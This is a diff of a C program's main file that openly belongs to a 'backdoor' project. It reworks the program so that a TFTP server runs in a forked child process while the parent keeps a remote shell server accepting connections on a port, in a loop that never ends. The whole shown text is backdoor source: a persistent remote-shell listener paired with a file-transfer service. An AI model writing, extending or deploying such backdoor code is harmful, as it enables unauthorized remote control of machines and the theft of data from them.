@@ -1,9 +1,11 @@
 #include <stdio.h>
 #include <stdbool.h>
 #include <string.h>
-#include <pthread.h>
 #include <unistd.h>
 #include <assert.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <stdlib.h>
 
 #include "common.h"
 #include "shell.h"
@@ -11,77 +13,130 @@
 #include "tftp.h"
 #include "backdoor.h"
 
-#define PTHREAD_CREATE_SUCCESS (0)
+#define FORK_CHILD (0)
+#define FORK_FAILED (-1)
+#define WAITPID_CONTINUE (0)
+#define WAITPID_FAILED (-1)
 
-static void *start_tftp_server(void *arg)
+/**
+ * @brief Starts and runs tftp server. Server can only handle one tftp connection at a time.
+ * 
+ * @param server_port [in] Port for starting new tftp connections.
+ * @param log_path [in] Path for log messages file.
+ * @return return_code_t 
+ */
+static return_code_t run_tftp_server(uint32_t server_port, char *log_path)
 {
-    assert(arg != NULL);
     return_code_t result = RC_UNINITIALIZED;
-    int32_t tftp_server = *((int32_t *)arg);
+    int32_t tftp_server_socket = -1;
 
-    result = tftp__run_server(tftp_server);
+    assert(NULL != log_path);
+
+    result = logger__init_logger(log_path);
+    if (RC_SUCCESS != result){
+        goto l_cleanup;
+    }
+
+    result = tftp__init_server(server_port, &tftp_server_socket);
+    if (RC_SUCCESS != result){
+        goto l_cleanup;
+    }
+
+    result = tftp__run_server(tftp_server_socket);
     if (RC_SUCCESS != result){
         goto l_cleanup;
     }
 
     result = RC_SUCCESS;
 l_cleanup:
-    return (void *)result;
-}
-
-static return_code_t run_shell_server(int32_t shell_server_socket)
-{
-    return_code_t result = RC_UNINITIALIZED;
-
-    while (true){
-        result = shell__handle_new_connection(shell_server_socket);
-        if (RC_SUCCESS != result){
-            goto l_cleanup;
-        }
+    if (-1 != tftp_server_socket){
+        tftp__destroy_server(&tftp_server_socket);
     }
+    logger__destory_logger();
 
-l_cleanup:
     return result;
 }
 
 int main(void)
 {
     return_code_t result = RC_UNINITIALIZED;
-    int32_t shell_server = -1;
-    int32_t tftp_server = -1;
-    pthread_t tftp_tid = 0;
-    int32_t temp_result = -1;
+    int32_t shell_server_socket = -1;
+    pid_t tftpd_pid = -1;
+    pid_t terminated_child = -1;
+    int tftpd_result = -1;
+    char log_message[MAX_LOG_MESSAGE_SIZE] = {0};
+    bool tftpd_alive = false;
 
-    result = logger__init_logger(LOG_PATH);
+    tftpd_pid = fork();
+    switch(tftpd_pid){
+        case FORK_FAILED:
+            handle_perror("Fork failed", RC_BACKDOOR__MAIN__FORK_FAILED);
+
+        case FORK_CHILD:
+            result = run_tftp_server(TFTP_REQUESTS_PORT, TFTP_LOG_PATH);
+            exit((int)result);
+
+        default:
+            // Parent process.
+            break;
+    }
+
+    tftpd_alive = true;
+
+    result = logger__init_logger(SHELL_LOG_PATH);
     if (RC_SUCCESS != result){
         goto l_cleanup;
     }
 
-    result = shell__init_server(SHELL_LISTENING_PORT, &shell_server);
+    result = shell__init_server(SHELL_SERVER_PORT, &shell_server_socket);
     if (RC_SUCCESS != result){
         goto l_cleanup;
     }
 
-    result = tftp__init_server(TFTP_REQUESTS_PORT, &tftp_server);
-    if (RC_SUCCESS != result){
-        goto l_cleanup;
+    while (tftpd_alive){
+        // Check if tftp server has died.
+        terminated_child = waitpid(tftpd_pid, &tftpd_result, WNOHANG);
+
+        switch(terminated_child){
+            case WAITPID_FAILED:
+                handle_perror("Waitpid failed", RC_BACKDOOR__MAIN__WAITPID_FAILED);
+
+            case WAITPID_CONTINUE:
+                result = shell__handle_new_connection(shell_server_socket);
+                if (RC_SUCCESS != result){
+                    goto l_cleanup;
+                }
+                break;
+
+            default:
+                // Tftp server has died.
+                if (WIFEXITED(tftpd_result)){
+                    snprintf(
+                        log_message,
+                        MAX_LOG_MESSAGE_SIZE,
+                        "TFTP server has terminated, return code: %d",
+                        WEXITSTATUS(tftpd_result)
+                    );
+                    logger__log(LOG_WARNING, log_message);
+                }
+                tftpd_alive = false;
+                break;
+        }
     }
 
-    temp_result = pthread_create(&tftp_tid, NULL, &start_tftp_server, (void *)&tftp_server);
-    if (PTHREAD_CREATE_SUCCESS != temp_result){
-        handle_perror("Pthread create failed", RC_BACKDOOR__MAIN__PTHREAD_CREATE_FAILED);
+    while(true){
+        result = shell__handle_new_connection(shell_server_socket);
+        if (RC_SUCCESS != result){
+            goto l_cleanup;
+        }
     }
 
-    result = run_shell_server(shell_server);
 
 l_cleanup:
-    if (-1 != shell_server){
-        shell__destroy_server(&shell_server);
-    }
-    if (-1 != tftp_server){
-        tftp__destroy_server(&tftp_server);
+    if (-1 != shell_server_socket){
+        shell__destroy_server(&shell_server_socket);
     }
     logger__destory_logger();
-    
+
     return (int)result;
 }
